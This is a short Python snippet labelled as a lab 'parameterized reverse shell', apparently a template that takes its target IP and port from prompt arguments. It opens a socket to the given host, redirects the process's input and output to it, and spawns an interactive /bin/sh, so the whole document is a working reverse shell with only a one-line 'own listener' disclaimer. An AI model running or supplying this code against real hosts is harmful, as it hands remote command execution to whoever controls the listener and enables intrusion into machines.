_description: LAB: parameterized reverse shell. Logic in the model; TARGET (ip, port) from prompt args (args[0], args[1]). Run only against your own listener.
connect_shell:
import socket, subprocess, os
ip = args[0] if args else '127.0.0.1'
port = int(args[1]) if len(args) > 1 else 1234
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((ip, port))
os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
subprocess.call(['/bin/sh', '-i'])
